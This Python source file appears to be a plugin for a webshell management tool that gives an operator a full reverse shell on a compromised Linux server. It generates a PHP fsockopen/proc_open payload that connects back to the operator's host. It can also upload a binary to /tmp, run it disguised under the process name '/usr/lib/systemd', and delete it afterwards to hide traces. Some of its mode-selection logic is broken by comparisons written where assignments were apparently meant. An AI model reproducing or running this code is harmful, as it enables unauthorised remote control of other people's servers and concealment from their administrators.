from libs.reverse_client_bash import main as bind
from libs.myapp import has_env
# from base64 import b64encode
from libs.c64 import encrypt
from os import getcwd, path
from threading import Thread

from libs.config import alias, color
from libs.myapp import delay_send, send, is_windows
from webshell_plugins.upload import run as upload


def get_php(host, port):
    return """$sock = fsockopen("%s", "%s");
$descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);""" % (host, port)


@alias(True, func_alias="rs", l="lhost", p="port", m="mode", f="fakename")
def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"):
    """
    shell

    Bind a port and wait for target connect back to get a full shell.
    """
    if (is_windows(False) or is_windows()):
        print(color.red(f"Only for both system is linux."))
        return False
    try:
        port = int(port)
    except ValueError:
        port = 23333
    MODE = 1
    command = get_php(lhost, port)
    print(color.yellow(f"Waring: You are using a testing command...."))
    print(color.yellow(f"        Please make sure Port {port} open...."))
    if (mode == 0):
        if (has_env("python")):
            print(color.green(f"Traget has python environment."))
            MODE == 1
        else:
            print(color.red(f"Traget has not python environment."))
            MODE == 3
    else:
        MODE = mode
    if (MODE == 1):
        print(color.yellow(f"Use Mode 1->python"))
    elif (MODE == 2):
        print(color.yellow(f"Use Mode 2->linux script command"))
    else:
        print(color.yellow(f"Use Mode 3->upload"))
        filename = encrypt(f"{lhost}-{port}")
        if not upload(path.join(getcwd(), "libs", "reverse_server_light"), "/tmp/%s" % filename, True):
            return
        command = f"system('cd /tmp && chmod +x {filename} && ./{filename} {fakename}');"
    t = Thread(target=delay_send, args=(2, command))
    t.setDaemon(True)
    t.start()
    print(f"Bind port {color.yellow(str(port))}...\n")
    if (not bind(port, MODE)):
        print(color.red(f"Bind port error."))
    if (MODE == 3):
        send(f"unlink('/tmp/{filename}');")
